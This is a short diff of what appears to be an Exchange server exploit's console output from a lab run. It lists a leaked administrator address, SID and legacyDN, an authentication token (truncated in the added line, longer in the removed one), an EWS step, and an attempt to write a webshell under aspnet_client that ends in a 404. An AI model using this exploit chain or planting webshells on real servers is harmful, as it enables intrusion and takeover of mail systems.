@@ -14,7 +14,7 @@ fqdn exchange.lab.local
 + admin@exchange.lab.local
 legacyDN /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=admin
 leak_sid S-1-5-21-3626636094-1513906978-1376853856-1156
-token VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBphZG1pbkB3b2huYmF1LXJhZGViZXJnLmNvbVUuUy0xL[snip]AAAA==
+token VgEAVAdX[cut]AAAA==
 set_ews Success with subject badqxybxtecxuttq
 write webshell at aspnet_client/tjmzk.aspx
 <Response [404]>
